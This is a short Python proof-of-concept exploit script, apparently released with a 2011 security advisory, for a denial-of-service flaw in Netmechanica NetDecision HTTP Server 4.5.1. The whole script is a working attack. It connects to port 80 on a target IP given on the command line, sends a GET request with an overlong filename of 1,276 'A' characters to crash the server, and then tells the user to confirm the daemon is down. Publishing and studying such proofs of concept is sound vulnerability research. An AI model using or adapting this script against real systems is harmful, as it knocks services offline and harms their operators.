#!/usr/bin/python
##############################################################################
#
# Title    : Netmechanica NetDecision HTTP Server Denial Of Service  
#            Vulnerability
# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
# Vendor   : http://www.netmechanica.com
# Advisory : http://secpod.org/blog/?p=484
#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt
#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py
# Software : Netmechanica NetDecision HTTP Server version 4.5.1
# Date     : 05/12/2011
#
###############################################################################

import socket,sys,time


if len(sys.argv) < 2:
        print "\t[-] Usage: python SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py target_ip"
        print "\t[-] Example : python SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py 127.0.0.1"
        print "\t[-] Exiting..."
        sys.exit(0)

port   = 80
target = sys.argv[1]

try:
    socket.inet_aton(target)
except socket.error:
    print "Invalid IP address found ..."
    sys.exit(1)

try:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((target,port))
except:
    print "socket() failed: Server is not running"
    sys.exit(1)

exploit = "GET "+ "A"*1276 + "\r\n" + "\r\n"

print "HTTP GET request with long filename triggers the vulnerability"
data = exploit
sock.sendto(data, (target, port))
time.sleep(5)
print "[+] Please verify the server daemon port, it must be down...."